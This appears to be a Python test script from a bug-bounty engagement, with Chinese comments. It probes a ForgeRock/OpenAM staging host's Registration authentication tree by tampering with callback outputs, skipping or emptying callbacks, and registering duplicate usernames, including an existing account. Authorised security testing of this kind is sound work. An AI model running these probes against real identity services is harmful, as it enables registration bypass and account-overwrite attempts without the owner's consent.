# -*- coding: utf-8 -*-
"""AIC 第三十五轮:认证树 Registration 提交逻辑(匿名面,单点打透)
承诺(认证树设计):callback 强制校验、注册流程不可篡改、用户名/邮箱唯一。
反例:
  A. 篡改 callback output(如把验证类 callback 的 output 值改掉/跳过必填 callback)
  B. 重复用户名/邮箱注册(覆盖已有账号?)
  C. 注册后新账户视角(与预置账户 pccp 的权限差异)
预期结果表:
  成立(漏洞) -> 提交被接受(注册成功无验证)或重复注册冲突处理异常;新账户权限异常
  不成立 -> 注册流强制校验(需要邮件验证码/提交被拒),新账户权限与 pccp 一致
"""
import requests, urllib3, json, time
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
AUTH = BASE + '/am/json/realms/alpha/authenticate'
S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                  'Accept-API-Version': 'resource=1.0, protocol=1.0',
                  'Content-Type': 'application/json'})

def start_tree(name):
    r = S.post(AUTH + '?authIndexType=service&authIndexValue=' + name, json={},
               timeout=15, verify=False)
    print('\n=== 启动树 [%s] -> %d' % (name, r.status_code))
    try:
        d = r.json()
    except Exception:
        print(r.text[:200])
        return None
    print('tokenId:', d.get('tokenId'))
    for i, cb in enumerate(d.get('callbacks', [])):
        print('  [%d] %s' % (i, json.dumps(cb, ensure_ascii=False)[:220]))
    return d

print('--- 1. Registration 树结构 ---')
d = start_tree('Registration')
if not d:
    raise SystemExit('cannot start Registration tree')
authId = d.get('authId')
cbs = d.get('callbacks', [])

print('\n--- 2. 构造合法提交(正常注册尝试) ---')
inp = []
for cb in cbs:
    t = cb['type']
    # 标准填充:用户名/密码/名/姓/邮箱/同意条款
    if t == 'NameCallback' or t == 'ValidatedUsernameCallback':
        val = 'regtest1643'
    elif t == 'PasswordCallback':
        val = 'RegTest1643!x'
    elif t == 'TextInputCallback' or 'AttributeInputCallback' in t:
        # 查看具体字段名
        names = [k.get('name') for k in cb.get('input', [])]
        val = 'Reg' if 'given' in str(names).lower() else ('Test' if 'sn' in str(names).lower() else 'x')
    elif t == 'BooleanAttributeInputCallback':
        val = True
    elif t == 'ChoiceCallback':
        val = 0
    elif t == 'KbaCreateCallback':
        val = 'question1'
    elif t == 'EmailCallback':
        val = 'regtest1643@example.com'
    else:
        val = 'x'
    inp.append({'name': cb.get('input', [{}])[0].get('name') if cb.get('input') else None,
                'value': val})
submit = {'authId': authId, 'callbacks': [{'type': cb['type'], 'output': cb.get('output', []),
                                            'input': [{'name': cb.get('input', [{}])[0].get('name'),
                                                       'value': inp[i]['value']}],
                                            '_id': cb.get('_id')} for i, cb in enumerate(cbs)]}
print('submit body:', json.dumps(submit, ensure_ascii=False)[:600])
r = S.post(AUTH + '?authIndexType=service&authIndexValue=Registration', json=submit,
           timeout=15, verify=False)
print('提交注册 -> %d %s' % (r.status_code, r.text[:400].replace('\n', ' ')))

print('\n--- 3. 负面测试:篡改 callback output / 跳过 callback ---')
# 3a. 把第一个 callback 的 output 篡改(验证类)
cbs2 = json.loads(json.dumps(cbs))
if cbs2:
    cbs2[0]['output'] = [{'name': 'value', 'value': 'INJECTED'}]
submit2 = {'authId': authId, 'callbacks': [{'type': cb['type'], 'output': cb.get('output', []),
                                             'input': cb.get('input', []), '_id': cb.get('_id')} for cb in cbs2]}
r = S.post(AUTH + '?authIndexType=service&authIndexValue=Registration', json=submit2,
           timeout=15, verify=False)
print('篡改 output 提交 -> %d %s' % (r.status_code, r.text[:200].replace('\n', ' ')))

# 3b. 只提交一个 callback(跳过其余)
submit3 = {'authId': authId, 'callbacks': [cbs[0]]}
r = S.post(AUTH + '?authIndexType=service&authIndexValue=Registration', json=submit3,
           timeout=15, verify=False)
print('单 callback 提交 -> %d %s' % (r.status_code, r.text[:200].replace('\n', ' ')))

# 3c. 空 callbacks
r = S.post(AUTH + '?authIndexType=service&authIndexValue=Registration', json={'authId': authId, 'callbacks': []},
           timeout=15, verify=False)
print('空 callbacks 提交 -> %d %s' % (r.status_code, r.text[:200].replace('\n', ' ')))

print('\n--- 4. 重复注册(用户名已存在:regtest1643 / pccp) ---')
for uname in ['regtest1643', 'pccp']:
    d2 = start_tree('Registration')
    if not d2:
        continue
    cbs3 = d2.get('callbacks', [])
    # 只填用户名,其余最小化
    inp3 = []
    for cb in cbs3:
        t = cb['type']
        names = [k.get('name') for k in cb.get('input', [])]
        if t == 'NameCallback' or t == 'ValidatedUsernameCallback':
            val = uname
        elif t == 'PasswordCallback':
            val = 'RegTest1643!x'
        elif 'AttributeInputCallback' in t:
            val = 'x'
        elif t == 'BooleanAttributeInputCallback':
            val = True
        else:
            val = 'x'
        inp3.append({'name': cb.get('input', [{}])[0].get('name') if cb.get('input') else None, 'value': val})
    sub = {'authId': d2.get('authId'), 'callbacks': [
        {'type': cb['type'], 'output': cb.get('output', []),
         'input': [{'name': inp3[i]['name'], 'value': inp3[i]['value']}], '_id': cb.get('_id')}
        for i, cb in enumerate(cbs3)]}
    r = S.post(AUTH + '?authIndexType=service&authIndexValue=Registration', json=sub,
               timeout=15, verify=False)
    print('重复注册 [%s] -> %d %s' % (uname, r.status_code, r.text[:250].replace('\n', ' ')))
    time.sleep(0.5)
